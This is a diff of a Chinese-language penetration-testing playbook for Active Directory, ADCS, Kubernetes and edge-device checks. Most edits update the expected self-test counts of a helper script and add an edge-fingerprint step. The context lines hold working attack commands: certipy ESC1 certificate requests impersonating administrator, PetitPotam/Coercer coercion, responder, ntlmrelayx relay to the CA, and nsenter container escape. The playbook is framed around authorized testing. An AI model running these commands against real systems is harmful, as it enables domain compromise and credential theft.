@@ -34,7 +34,7 @@
 ### 04 ADCS ESC1 模板验证（源：exploiting-active-directory-certificate-services-esc1）
 - 触发词：ESC1、SAN、certipy req、certipy auth、证书模板
 - 前置：`certipy find -vulnerable` 有输出；当前账号对目标模板有 Enroll；授权允许申请测试证书
-- 步骤：1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --help` → rc=0，期望：usage 含 `--input`/`--kind`；2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --input Tool/cases/ad-cloud04/input/bundle.json --json` → rc=0，期望：results 中 `"kind": "adcs"` 且 `"verdict": "candidate"`；3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`{"ok": true, "checks": 10, "kinds": 8}`
+- 步骤：1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --help` → rc=0，期望：usage 含 `--input`/`--kind`；2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --input Tool/cases/ad-cloud04/input/bundle.json --json` → rc=0，期望：results 中 `"kind": "adcs"` 且 `"verdict": "candidate"`；3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`{"ok": true, "checks": 24, "kinds": 9}`
   1) `certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout` → rc=0｜期望输出：目标模板段 `ESC1 : True`、`Enroll` 含当前账号、`Manager Approval : False`。
   2) `certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -template '<Tpl>' -upn "administrator@$DOMAIN"` → rc=0｜期望输出：`Saved certificate and private key to 'administrator.pfx'`；rc=1（`CERTSRV_E_*`/`denied by policy`）=ESC1 不成立，停。
   3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind adcs --input Tool/cases/ad-cloud04/input/adcs-only.json` → rc=0｜期望输出：`"kind": "adcs"`、`"verdict": "candidate"`、`checks[0].check`=`esc-rule-hit`（只拿到 pfx 就是 candidate，不是 confirmed）；rc=2 = 输入 schema 不对。
@@ -46,7 +46,7 @@
 ### 05 强制认证（PetitPotam/Coercer）前提核查（源：coercing-authentication-with-coercer-petitpotam）
 - 触发词：PetitPotam、Coercer、强制认证、MS-EFSRPC、relay
 - 前置：明确授权强制认证目标；有可用 relay/监听端；确认不会影响生产
-- 步骤：1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --help` → rc=0，期望：usage 含 `--kind` 与 `adcs-esc`；2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind adcs-esc --input Tool/cases/ad-cloud01/input/adcs-find.json` → rc=0，期望：`"esc_flags"` 含 `ESC11`/`ESC17` 且 `"verdict": "candidate"`；3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`{"ok": true, "checks": 10, "kinds": 8}`
+- 步骤：1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --help` → rc=0，期望：usage 含 `--kind` 与 `adcs-esc`；2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind adcs-esc --input Tool/cases/ad-cloud01/input/adcs-find.json` → rc=0，期望：`"esc_flags"` 含 `ESC11`/`ESC17` 且 `"verdict": "candidate"`；3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`{"ok": true, "checks": 24, "kinds": 9}`
   1) `nxc smb <target> -u '' -p '' -M coerce_plus -o LISTENER=<LISTENER_IP>` → rc=0｜期望输出：`Coerce+ ... EFSRPC/DFSCoerce` 命中；`STATUS_ACCESS_DENIED`=接口已补，停。
   2) `sudo responder -I eth0 -A`（或专用监听端）→ rc=0｜期望输出：`[SMB] NTLMv2-SSP Client : <target_ip>`，记时间与来源。
   3) `impacket-ntlmrelayx -t 'http://<CA_HOST>/certsrv/certfnsh.asp' -smb2support --adcs --template 'DomainController'` → rc=0｜期望输出：`GOT CERTIFICATE!` + `Writing PKCS#12 certificate`。
@@ -76,7 +76,7 @@
 - 前置：有 DC Security 日志或 EDR 遥测；授权允许读日志；不执行真实 DCSync
 - 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
   1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind windows-events --input Tool/cases/ad-cloud03/input/security-events.json --json` → rc=0｜期望输出：`"verdict": "blocked"`、`summary.kerberos_events`=0、`summary.counts."4624"`=50、`summary.record_id_gaps`=[]
-  2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 10, "kinds": 8}`
+  2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 24, "kinds": 9}`
   3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --help` → rc=0｜期望输出：usage 含 `windows-events` 与 `ntlm-type2`
 - 判据：4662 的对象 GUID 指向域命名上下文、账号具备复制权限、时间线与 4769 对齐；三条同时成立才是强证据（脚本只做离线复算，4662/4769 仍需 DC Security 日志）
 - 失败判据：只有单条 4662、账号无复制权限、日志缺口/转发 → 不能写 DCSync，降级为 candidate 并补遥测
@@ -182,7 +182,7 @@
 ### 20 K8s RBAC 提权审计（源：auditing-kubernetes-rbac-privilege-escalation）
 - 触发词：RBAC、ClusterRole、RoleBinding、wildcard、escalate、bind
 - 前置：有只读 RBAC 权限；授权允许读 role/clusterrole/binding
-- 步骤：1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --input Tool/cases/ad-cloud04/input/bundle.json --json` → rc=0，期望：results 含 `"kind": "k8s-rbac"` 且 `"verdict": "candidate"`；2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`"kinds": 8`；3) `python Tool/scripts/adcloud-check.py --self-test` → rc=0，期望：`"ok": true`
+- 步骤：1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --input Tool/cases/ad-cloud04/input/bundle.json --json` → rc=0，期望：results 含 `"kind": "k8s-rbac"` 且 `"verdict": "candidate"`；2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`"kinds": 9`；3) `python Tool/scripts/adcloud-check.py --self-test` → rc=0，期望：`"ok": true`
   1) `kubectl get clusterrolebinding,rolebinding -A -o json > rbac.json` → rc=0｜期望输出：`items` ≥ 1 且 subject 含当前 SA/用户；空 `items` = 无可审面。
   2) 把绑定与当前身份整理成 `{"kind":"k8s-rbac","can_i":[...]}` 后跑 `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind k8s-rbac --input Tool/cases/ad-cloud04/input/k8s-rbac-only.json` → rc=0｜期望输出：`"verdict": "candidate"`、`allowed_count`=2；自建输入时 `checks[].ok` 必须与 `auth can-i` 一致；rc=2 → 打印 `{"ok": false, "blocked_at": ...}`，先修输入。
   3) `kubectl auth can-i create pods --as=system:serviceaccount:<ns>:<sa>` → rc=0｜期望输出：`yes` 才算路径成立；`no` = blocked，转 Secret/CI。
@@ -228,7 +228,7 @@
 - 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
   1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --input Tool/cases/ad-cloud04/input/bundle.json --json` → rc=0｜期望输出：`results` 5 条且 `"summary": {"candidate": 5}`；`kind=delegation` 的 `accounts[0].ticket_obtained`=false、`paths` 含 `unconstrained`（有委派属性但无票据 → 只能写 candidate）
   2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind windows-events --input Tool/cases/ad-cloud03/input/security-events.json --json` → rc=0｜期望输出：`"verdict": "blocked"`、`summary.counts."4624"`=50、`summary.kerberos_events`=0（单机无域事件 → 不能证明横向成功）
-  3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 10, "kinds": 8}`
+  3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 24, "kinds": 9}`
 - 判据：目标侧出现预期身份的 4688（父进程 WmiPrvSE.exe/mmc.exe/services.exe）、7045、4698 或命令回显，且与 4624 类型 3 的账号/来源/时间对齐；relay 额外要目标 4624+4776；只认证成功/ReturnValue=0 不算
 - 失败判据：目标无 4688/7045/4698/回显、认证 SUCCEED 无会话、Access denied/0x80070005、SMB/LDAP signing 强制 → 当前手法 blocked，按 `06-lateral-movement.md` 的四列换面，不重复 relay
 - reference：Tool/skill/ad-cloud/references/06-lateral-movement.md
@@ -238,7 +238,7 @@
 - 前置：授权清单只有 IP/域名；允许只读协商/绑定/AS-REQ；书面禁止爆破、写、投毒（LLMNR/NBT-NS/WPAD/伪造 DC/票据注入）
 - 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
   1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind ntlm-type2 --input Tool/cases/ad-cloud01/input/ntlm-type2.json --json` → rc=0｜期望输出：`"verdict": "candidate"`、`"dns_domain": "corp.local"`、`"os_version": "10.0.20348"`、`"timestamp": "2026-10-21T14:00:00Z"`、`"auth_attempted": false`（只解析，不发认证）
-  2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 10, "kinds": 8}`
+  2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 24, "kinds": 9}`
   3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --help` → rc=0｜期望输出：usage 含 `ntlm-type2` 与 `--kind`
 - 判据：type 2 能解析出域/OS/时间戳只到 candidate；LDAP rootDSE resultCode=0 只到 candidate；KDC 错误码 6/25/AS-REP 可分类；challenge 只留指纹；全程未爆破、未写、未投毒
 - 失败判据：只有端口开放无协议响应、type 2 解析失败、LDAP 匿名 49/8、KDC 只回 25、时差 >5 分钟 → 记 blocked/unknown，不得用口令字典或写入把“只读枚举”升级成验证
@@ -250,7 +250,7 @@
 - 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
   1) `python Tool/scripts/adcloud-check.py --kubeconfig Tool/cases/ad-cloud01/input/kubeconfig.yaml --json` → rc=0｜期望输出：`"ok": true`、`"current_context": "lab-context-01"`、`"insecure_skip_tls_verify": true`、`anonymous_risk`=false、findings 含 `K8S-TRANSPORT-002`/`K8S-RBAC-003`/`K8S-RBAC-006`
   2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind k8s-rbac --input Tool/cases/ad-cloud04/input/k8s-rbac-only.json --json` → rc=0｜期望输出：`"kind": "k8s-rbac"`、`"verdict": "candidate"`、`allowed_count`=2、`checks` 5 条，且 `host-proof`=false / `secret-proof`=false（有权限面但无宿主证据 → 只能 candidate）
-  3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 10, "kinds": 8}`
+  3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 24, "kinds": 9}`
   4) 容器内原语：`capsh --print`、`stat -fc %T /sys/fs/cgroup/`、`test -w /var/run/docker.sock`；宿主侧：`nsenter -t 1 -m -u -i -n -p -- hostname`（仅授权容器；rc=0 且返回节点 hostname ≠ 容器 hostname 才升级 confirmed）
 - 判据：容器内原语可机检为真 + 宿主侧独立证据（节点 hostname/节点文件哈希/节点 auditd）+ `auth can-i` yes 后实际动作成功；缺宿主证据最高 candidate
 - 失败判据：缺 CAP_SYS_ADMIN/只读挂载/seccomp、cgroup v2 无 release_agent、runc 已升级、10255 只读、etcd 只回 version/health、PSA/Quota 拒 → 对应原语 blocked，按 `k8s-and-container.md` 3.5/4 节换面，不反复提权
@@ -260,11 +260,12 @@
 - 触发词：SSL VPN、AnyConnect、FortiGate、NetScaler、GlobalProtect、OWA、Zimbra、Okta、Entra、NTLM type 2
 - 前置：清单只有域名/IP；书面允许只读指纹与公开 metadata；禁止提交凭据、口令喷洒、用户枚举、投毒
 - 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
-  1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind ntlm-type2 --input Tool/cases/ad-cloud01/input/ntlm-type2.json --json` → rc=0｜期望输出：`"verdict": "candidate"`、`"dns_domain": "corp.local"`、`"os_version": "10.0.20348"`、`"timestamp": "2026-10-21T14:00:00Z"`、`"auth_attempted": false`、`checks` 6 条全 true
-  2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 10, "kinds": 8}`
-  3) `curl -skI https://<target>/+CSCOE+/logon.html` → rc=0｜期望：200/302 且 `Set-Cookie: webvpn=`/页内 `AnyConnect`；404 且无厂商串 = blocked，换厂商
-  4) `curl -s 'https://login.microsoftonline.com/getuserrealm.srf?login=<user>@<domain>&xml=1'` → rc=0｜期望：`<NameSpaceType>Managed|Federated</NameSpaceType>` + `AuthURL`；域不匹配/404 = 换域
-  5) 其余只读面：Okta `/.well-known/okta-organization` 取 `id`/`issuer`；Zimbra 匿名 `GetVersionInfoRequest` 取 `VersionString`；OWA 只看 `X-OWA-Version` / 一次无凭据 Type-1 negotiate
-- 判据：指纹命中 + 公开端点返回可解析字段（XML/JSON/版本串）；NTLM type 2 只到 candidate；证据包里能写“未提交凭据/未爆破/未投毒/未发利用包”
+  1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind edge-fingerprint --fixture Tool/cases/ad-cloud01/input/edge-fingerprint.json` → rc=0｜期望输出：`"ok": true`、`"kind": "edge-fingerprint"`、`"offline": true`、`results` 10 条、`summary` 含 `candidate/high`=9 与 `candidate/med`=1（`microsoft-owa` 缺 `X-OWA-Version` 只能 med）、每条 `auth_attempted`: false
+  2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind ntlm-type2 --input Tool/cases/ad-cloud01/input/ntlm-type2.json --json` → rc=0｜期望输出：`"verdict": "candidate"`、`"dns_domain": "corp.local"`、`"os_version": "10.0.20348"`、`"timestamp": "2026-10-21T14:00:00Z"`、`"auth_attempted": false`、`checks` 6 条全 true
+  3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 24, "kinds": 9}`，含 `edge_products`: 10
+  4) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind edge-fingerprint --url https://<target>/` → rc=0｜期望：`product`/`confidence`/`evidence[{header,path,value}]`/`judgement` 均有值；无厂商串时 `verdict`: blocked（`--strict` rc=3），不猜服务
+  5) `curl -skI https://<target>/+CSCOE+/logon.html` → rc=0｜期望：200/302 且 `Set-Cookie: webvpn=`/页内 `AnyConnect`；404 且无厂商串 = blocked，换厂商
+  6) `curl -s 'https://login.microsoftonline.com/getuserrealm.srf?login=<user>@<domain>&xml=1'` → rc=0｜期望：`<NameSpaceType>Managed|Federated</NameSpaceType>` + `AuthURL`；域不匹配/404 = 换域；其余只读面（Okta well-known / Zimbra GetVersionInfoRequest）只看公开字段
+- 判据：`--kind edge-fingerprint` 输出 `product`/`confidence`/`evidence`/`judgement`，单线索=low、两条独立线索=med、专属 cookie/版本串+专属路径=high；`high` 仍只到 `candidate`（暴露面）；`auth_attempted` 恒 false；证据包写“未提交凭据/未爆破/未投毒/未发利用包”；NTLM type 2 只到 candidate
 - 失败判据：只有端口/登录页、metadata 要登录、租户不匹配、SOAP 要求 authToken、AuthURL 指向清单外 IdP → blocked/unknown；不得用默认口令、CVE 路径字典或用户名枚举升级验证
 - reference：Tool/skill/ad-cloud/references/ad-attacks.md
